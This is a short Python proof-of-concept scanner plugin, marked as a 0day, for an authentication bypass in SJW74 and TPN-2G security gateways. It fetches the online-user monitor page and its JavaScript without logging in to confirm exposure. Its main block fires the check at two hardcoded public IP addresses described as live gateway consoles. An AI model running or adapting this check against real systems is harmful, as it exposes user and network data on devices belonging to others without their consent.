#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  SJW74系列安全网关 和 全网行为管理TPN-2G安全网关 在线用户
Author    :  a
mail      :  a@lcx.cc
 
refer :  0day

 Ext.QuickTips.init();
Ext.form.Field.prototype.msgTarget = null;
var userFlow,selText,selId,ip,Vlan_id;
//图片相对应
var clts=new Array(20);
clts[0]="其他策略";
clts[1]="应用控制策略";   
clts[2]="应用流控策略";
clts[3]="应用审计策略";
clts[4]="主机策略";
clts[5]="网页搜索策略";
clts[6]="用户流控策略";
clts[7]="内容过滤策略";
clts[8]="SSLVPN策略";
clts[9]="网址库策略";

 因为页面采用的js加载请求服务，对身份进行了简单的验证 ，可以绕过。
	    
"""
import urlparse
import time

def assign(service, arg):
    if service == 'adtsec_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
     
    url = arg + 'monitor/onlineuser.html'
    code2, head, res, errcode, _ = curl.curl2(url )
    if 'onlineuser.js' in res:
        code2, head, res, errcode, _ = curl.curl2(arg + 'monitor/onlineuser.js' )
        if 'var userFlow,selText,selId,ip,Vlan_id' in res and 'URL_LOG_ONLINEUSER' in res and 'sslvpn/ssl_list' in res:
            security_warning(url)
    
   

if __name__ == '__main__':
    from dummy import *
    audit(assign('adtsec_gateway', 'http://211.144.102.114:8080')[1]) # TPN-2G网关控制台
    audit(assign('adtsec_gateway', 'http://60.174.80.249:8080')[1]) #SJW74 VPN网关控制台